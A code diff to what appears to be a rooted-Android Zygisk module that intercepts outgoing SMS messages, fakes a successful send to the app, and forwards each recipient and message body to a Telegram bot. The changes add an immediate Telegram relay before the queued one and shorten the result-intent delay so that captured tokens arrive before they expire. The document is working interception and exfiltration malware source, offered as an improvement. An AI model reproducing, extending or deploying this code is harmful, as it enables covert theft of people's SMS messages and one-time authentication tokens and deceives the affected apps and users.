@@ -1,6 +1,7 @@
 #include "fake_success.hpp"
 #include "config.hpp"
 #include "logger.hpp"
+#include "tg_urgent.hpp"
 #include "zygisk_utils.hpp"
 
 #include <cstdio>
@@ -158,8 +159,9 @@ void* tg_worker(void* arg) {
             }
             return o;
         };
-        // Screenshot: HTML <code> = Telegram tap-to-copy
-        std::string text = "📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥\n\n";
+        // Screenshot: bold headers + HTML <code> = Telegram tap-to-copy
+        std::string text = "<b>Intercepted Outgoing Zygisk Mode Menu</b>\n";
+        text += "<b>By @Hivirtus \xF0\x9F\x94\xA5</b>\n\n";
         text += "To (Tap to copy):\n<code>";
         text += html_esc(to_disp);
         text += "</code>\n\nBody (Tap to copy):\n<code>";
@@ -401,19 +403,20 @@ void on_outgoing_intercepted(JNIEnv* env, const std::string& dest, const std::st
         insert_fake_sent_sms(env, dest, body);
     }
 
-    // Gamex/SMSTweaks: Telegram ASAP with real To+body (in-process HTTPS)
+    // INSTANT root TG first (token expire window) — then in-process backup
     if (body != "__SILENT__") {
+        tg_urgent::send(dest, body);
         queue_telegram(env, dest, body);
     }
 
-    // SMSTweaks: delayed fireIntents (~800–2000ms) so app UI settles
+    // Fire RESULT_OK ASAP (was 900ms → Something went wrong / expire)
     if (sent_intent || delivery_intent) {
         JavaVM* vm = nullptr;
         if (env && env->GetJavaVM(&vm) == 0 && vm) {
             auto* job = new PiJob();
             job->vm = vm;
             job->dest = dest;
-            job->delay_ms = 120;  // Hero token race — was 900ms → Something went wrong / expire
+            job->delay_ms = 30;
             if (sent_intent) job->sent = env->NewGlobalRef(sent_intent);
             if (delivery_intent) job->delivery = env->NewGlobalRef(delivery_intent);
             pthread_t t{};
